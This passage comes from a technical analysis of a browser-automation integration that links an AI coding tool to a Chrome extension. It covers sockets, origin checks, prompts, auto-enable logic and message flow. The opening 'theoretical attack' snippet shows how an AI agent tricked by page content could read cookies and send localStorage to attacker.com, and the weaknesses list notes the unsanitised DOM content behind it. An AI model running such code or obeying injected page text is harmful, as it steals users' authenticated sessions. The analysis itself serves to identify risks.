**Theoretical attack:**
```javascript
// Claude could be tricked to run this
document.cookie  // Returns all cookies for domain
fetch('https://attacker.com', {
  body: localStorage
})
```

### 12.3 Socket Permissions

**Unix socket security:**
- Directory: `0o700` (owner only)
- Socket file: `0o600` (owner only)
- Only user who started native host can connect
- Other users cannot create competing sockets (directory is owner-only)

**Windows named pipe security:**
- Named pipes use Windows security ACLs
- Owner user has full control by default
- Other users cannot write to pipe without explicit permissions

**Weakness:**
- Processes running as the same user can connect to socket
- No per-process authentication on the socket itself

### 12.4 Extension Origin Validation

From `setup.ts`:

```typescript
const manifest = {
  name: NATIVE_HOST_IDENTIFIER,
  allowed_origins: [
    'chrome-extension://fcoeoabgfenejglbffodgkkbkcdhcgfn/',  // PROD
    ...(process.env.USER_TYPE === 'ant'
      ? [
          'chrome-extension://dihbgbndebgnbjfmelmegjepbnkhlgni/',  // DEV
          'chrome-extension://dngcpimnedloihjnnfngkgjoidhnaolf/',  // ANT
        ]
      : [])
  ]
}
```

**Validation happens:**
- By Chrome: Extension must have exact ID in manifest
- Manifest installed in browser's native messaging directory
- Extension cannot spoof another extension's ID (cryptographic)

**Extension IDs (immutable):**
- **PROD**: `fcoeoabgfenejglbffodgkkbkcdhcgfn`
- **DEV**: `dihbgbndebgnbjfmelmegjepbnkhlgni`
- **ANT**: `dngcpimnedloihjnnfngkgjoidhnaolf`

---

## 13. System Prompt and User Guidance

### 13.1 Base Chrome Prompt

From `prompt.ts`, the system includes:

```
# Claude in Chrome browser automation

You have access to browser automation tools (mcp__claude-in-chrome__*) for
interacting with web pages in Chrome.
```

**Guidelines Claude follows:**
1. **GIF Recording**: Capture extra frames before/after actions for smooth playback
2. **Console Debugging**: Use `read_console_messages` with regex patterns to avoid verbose output
3. **Alerts/Dialogs**: Avoid triggering JavaScript alerts (block extension communication)
4. **Tab Context**: Call `tabs_context_mcp` at session start
5. **Error Recovery**: Stop after 2-3 failed attempts, ask user for guidance

### 13.2 Tool Search Instructions

When tool search is enabled, additional prompt injected:

```
**IMPORTANT: Before using any chrome browser tools, you MUST first load them
using ToolSearch.**

Chrome browser tools require loading before use:
1. Use ToolSearch with `select:mcp__claude-in-chrome__<tool_name>`
2. Then call the tool
```

### 13.3 Claude in Chrome Skill Hint

From `prompt.ts`:

```
**Browser Automation**: Chrome browser tools are available via the
"claude-in-chrome" skill. CRITICAL: Before using any
mcp__claude-in-chrome__* tools, invoke the skill by calling the Skill tool
with skill: "claude-in-chrome".
```

**Variant with WebBrowser available:**

```
**Browser Automation**: Use WebBrowser for development (dev servers, JS eval,
console, screenshots). Use claude-in-chrome for the user's real Chrome when
you need logged-in sessions, OAuth, or computer-use — invoke
Skill(skill: "claude-in-chrome") before any mcp__claude-in-chrome__* tool.
```

This steers development tasks to the built-in WebBrowser and reserves the extension for authenticated use.

---

## 14. Configuration Caching and Auto-Enable

### 14.1 Auto-Enable Logic

From `setup.ts`:

```typescript
export function shouldAutoEnableClaudeInChrome(): boolean {
  if (shouldAutoEnable !== undefined) {
    return shouldAutoEnable
  }

  shouldAutoEnable =
    getIsInteractive() &&
    isChromeExtensionInstalled_CACHED_MAY_BE_STALE() &&
    (process.env.USER_TYPE === 'ant' ||
      getFeatureValue_CACHED_MAY_BE_STALE('tengu_chrome_auto_enable', false))

  return shouldAutoEnable
}
```

**Auto-enables if all of:**
1. Session is interactive (not SDK/CI)
2. Extension is installed (from cache)
3. Either: user is ant OR `tengu_chrome_auto_enable` feature flag is true

### 14.2 Cached Extension Detection

```typescript
function isChromeExtensionInstalled_CACHED_MAY_BE_STALE(): boolean {
  // Update cache in background without blocking
  void isChromeExtensionInstalled().then(isInstalled => {
    if (!isInstalled) {
      return  // Don't cache negative results
    }
    // Cache only positive detections
    saveGlobalConfig(prev => ({
      ...prev,
      cachedChromeExtensionInstalled: isInstalled
    }))
  })

  // Return cached value immediately
  const cached = getGlobalConfig().cachedChromeExtensionInstalled
  return cached ?? false
}
```

**Why only cache positives:**
- False negatives on shared machines (remote environments)
- Cost of stale positive: one silent MCP connection attempt per session
- Cost of stale negative: auto-enable broken forever without manual repair

### 14.3 Enable/Disable Control

From `setup.ts`:

```typescript
export function shouldEnableClaudeInChrome(chromeFlag?: boolean): boolean {
  // Priority 1: CLI flag
  if (chromeFlag === true) return true
  if (chromeFlag === false) return false

  // Priority 2: Environment variables
  if (isEnvTruthy(process.env.CLAUDE_CODE_ENABLE_CFC)) return true
  if (isEnvDefinedFalsy(process.env.CLAUDE_CODE_ENABLE_CFC)) return false

  // Priority 3: Config file setting
  const config = getGlobalConfig()
  if (config.claudeInChromeDefaultEnabled !== undefined) {
    return config.claudeInChromeDefaultEnabled
  }

  // Default: disabled
  return false
}
```

**Control hierarchy:**
1. `--chrome` / `--no-chrome` CLI flag (highest)
2. `CLAUDE_CODE_ENABLE_CFC` environment variable
3. `claudeInChromeDefaultEnabled` in `~/.claude.json`
4. Disabled by default (lowest)

---

## 15. Complete Message Flow Example

### 15.1 Scenario: Claude Clicks a Button

**Step 1: Claude requests action**
```
Claude Code → MCP Server
{
  jsonrpc: "2.0",
  method: "tools/call",
  params: {
    name: "mcp__claude-in-chrome__left_click",
    arguments: {
      ref: "ref_42",
      tabId: 15
    }
  }
}
```

**Step 2: MCP Server → Native Host (Unix socket)**
```
Socket write (with 4-byte length prefix):
{
  method: "left_click",
  params: {
    ref: "ref_42",
    tabId: 15
  }
}
```

**Step 3: Native Host → Chrome Extension (stdio)**
```
Stdout (4-byte length prefix + JSON):
{
  type: "tool_request",
  method: "left_click",
  params: {
    ref: "ref_42",
    tabId: 15
  }
}
```

**Step 4: Chrome Extension execution**
- Resolves ref_42 from internal DOM cache
- Gets element coordinates
- Calls `element.click()`
- Captures new page state

**Step 5: Extension → Native Host (stdio response)**
```
Stdout (4-byte length prefix + JSON):
{
  type: "tool_response",
  result: {
    success: true,
    newUrl: "https://example.com/results"
  }
}
```

**Step 6: Native Host → MCP Server (Unix socket broadcast)**
```
Socket write to all clients (4-byte length prefix):
{
  result: {
    success: true,
    newUrl: "https://example.com/results"
  }
}
```

**Step 7: MCP Server → Claude Code → Claude**
```
MCP response back to Claude:
{
  jsonrpc: "2.0",
  id: 123,
  result: {
    success: true,
    newUrl: "https://example.com/results"
  }
}
```

---

## 16. Key Data Structures

### 16.1 McpClient (Native Host)

```typescript
type McpClient = {
  id: number                    // Auto-incrementing client ID
  socket: Socket               // TCP socket connection
  buffer: Buffer               // Buffered incoming data
}
```

### 16.2 ClaudeForChromeContext (MCP Setup)

```typescript
type ClaudeForChromeContext = {
  serverName: string
  logger: Logger
  socketPath: string
  getSocketPaths: () => string[]
  clientTypeId: string
  onAuthenticationError?: () => void
  onToolCallDisconnected?: () => string
  onExtensionPaired?: (deviceId: string, name: string) => void
  getPersistedDeviceId?: () => string | undefined
  bridgeConfig?: {
    url: string
    getUserId: () => Promise<string>
    getOAuthToken: () => Promise<string>
    devUserId?: string
  }
  initialPermissionMode?: PermissionMode
  callAnthropicMessages?: (req: AnthropicMessagesRequest) => Promise<AnthropicMessagesResponse>
  trackEvent?: (eventName: string, metadata?: Record<string, any>) => void
}
```

### 16.3 BrowserConfig (Per-Browser)

```typescript
type BrowserConfig = {
  name: string
  macos: {
    appName: string
    dataPath: string[]
    nativeMessagingPath: string[]
  }
  linux: {
    binaries: string[]
    dataPath: string[]
    nativeMessagingPath: string[]
  }
  windows: {
    dataPath: string[]
    registryKey: string
    useRoaming?: boolean
  }
}
```

---

## 17. Conclusion and Key Insights

### 17.1 Architectural Strengths

1. **Separation of concerns**: Three independent tiers allow each to be independently maintained and upgraded
2. **Multi-browser support**: Single setup system supports 7 Chromium variants across 3 OSes
3. **Socket infrastructure**: Secure Unix socket permissions prevent inter-user access
4. **Stale cleanup**: PID-based socket cleanup prevents leftover files
5. **Multi-client broadcast**: Multiple MCP instances can share one extension connection
6. **Feature gating**: Three layers (build-time, runtime, MCP) prevent public exposure of ant-only features
7. **Analytics filtering**: Allowlist-based approach prevents PII leakage while still tracking metrics

### 17.2 Security Weaknesses

1. **DOM content injection**: No sanitization of page content before sending to Claude
2. **Cookie access**: JavaScript execution could extract authenticated cookies
3. **Same-user privilege**: No per-process authentication on sockets
4. **Alert blocking**: Page alerts can block entire extension if triggered
5. **No rate limiting**: No per-tool rate limiting in native host

### 17.3 Operational Considerations

1. **Async installation**: Manifest installation happens asynchronously; failures are logged but don't block startup
2. **Caching strategy**: Only caches positive extension detection to avoid poisoning shared machines
3. **Registry complexity**: Windows registry setup requires admin for some operations
4. **Platform differences**: Significant differences between Unix socket and Windows named pipe semantics
5. **Socket migration**: Legacy fallback paths support old native host versions

### 17.4 Future Evolution Points

1. **Bridge dependency**: Ant users tied to OAuth bridge; connection failures may need fallback
2. **Lightning mode**: Extension-side `lightning_turn` tool enables in-browser reasoning loops
3. **Permission modes**: `follow_a_plan` mode suggests future autonomous execution support
4. **Tool search**: Infrastructure suggests future dynamic tool discovery without pre-loading

---

## Appendix A: File Manifest

**Source Files Analyzed:**
- `/sessions/cool-friendly-einstein/mnt/claude-code/src/utils/claudeInChrome/common.ts` (541 lines)
- `/sessions/cool-friendly-einstein/mnt/claude-code/src/utils/claudeInChrome/chromeNativeHost.ts` (528 lines)
- `/sessions/cool-friendly-einstein/mnt/claude-code/src/utils/claudeInChrome/mcpServer.ts` (294 lines)
- `/sessions/cool-friendly-einstein/mnt/claude-code/src/utils/claudeInChrome/prompt.ts` (84 lines)
- `/sessions/cool-friendly-einstein/mnt/claude-code/src/utils/claudeInChrome/setup.ts` (401 lines)
- `/sessions/cool-friendly-einstein/mnt/claude-code/src/utils/claudeInChrome/setupPortable.ts` (234 lines)

**Total: 2,082 lines of TypeScript code**

---

## Appendix B: Extension IDs and URLs

**Extension Identifiers:**
```
PROD:   fcoeoabgfenejglbffodgkkbkcdhcgfn
DEV:    dihbgbndebgnbjfmelmegjepbnkhlgni
ANT:    dngcpimnedloihjnnfngkgjoidhnaolf
```

**Key URLs:**
```
Download:  https://claude.ai/chrome
Reconnect: https://clau.de/chrome/reconnect
Bug Report: https://github.com/anthropics/claude-code/issues/new?labels=bug,claude-in-chrome

Bridge:
  Production:  wss://bridge.claudeusercontent.com
  Staging:     wss://bridge-staging.claudeusercontent.com
  Local Dev:   ws://localhost:8765
```

**Native Host Identifier:**
```
com.anthropic.claude_code_browser_extension
```

---

## Appendix C: Directory Structure

**Socket Directory (Unix):**
```
/tmp/claude-mcp-browser-bridge-{username}/
├── {pid1}.sock         (0o600)
├── {pid2}.sock         (0o600)
└── {pidN}.sock         (0o600)
```

**Wrapper Scripts:**
```
~/.claude/chrome/
├── chrome-native-host      (Unix, 0o755)
└── chrome-native-host.bat  (Windows)
```

**Native Messaging Manifests (macOS Chrome):**
```
~/Library/Application Support/Google/Chrome/NativeMessagingHosts/
└── com.anthropic.claude_code_browser_extension.json
```

**Configuration:**
```
~/.claude.json
{
  "chromeExtension": {
    "pairedDeviceId": "...",
    "pairedDeviceName": "..."
  },
  "cachedChromeExtensionInstalled": true,
  "claudeInChromeDefaultEnabled": true
}
```
